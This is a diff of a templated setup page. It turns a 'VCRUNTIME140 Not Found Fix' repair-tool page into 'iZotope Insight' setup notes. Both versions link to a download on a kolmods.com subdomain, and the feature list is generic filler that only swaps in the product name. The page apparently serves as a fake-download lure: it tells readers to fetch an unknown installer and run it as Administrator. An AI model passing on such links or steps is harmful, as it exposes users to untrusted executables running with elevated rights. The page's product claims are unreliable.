@@ -1,14 +1,10 @@
-# VCRUNTIME140 Not Found Fix Repair Fix Notes
+# iZotope Insight Windows Setup Notes
 
-<p align="center">
-  <a href="https://vcruntime140-not-found-fix.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-VCRUNTIME140%20Not%20Found%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download VCRUNTIME140 Not Found Fix">
-  </a>
-</p>
+**Download:** [Get Windows installer →](https://izotope-insight-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **VCRUNTIME140 Not Found Fix** on Windows 10/11 (64-bit). Run the repair tool as Administrator.
+> Setup notes for **iZotope Insight** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -16,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **VCRUNTIME140 Not Found Fix** from the Start menu
+5. Restart if the installer asks — then launch **iZotope Insight** from the Start menu
 
 ## What you can use it for
 
-- Repair VCRUNTIME140 Not Found Fix errors on Windows 10/11
-- Fix broken system files and misconfigured services
-- Restore stability after updates or driver changes
-- Clear error codes blocking normal PC use
-- Return Windows to a working baseline state
+- Core iZotope Insight features on Windows desktop
+- Install and configure iZotope Insight for daily use
+- Import, edit, and export with iZotope Insight tools
+- Tune settings and profiles inside iZotope Insight
+- Integrate iZotope Insight into your existing workflow
 
 ## License
 
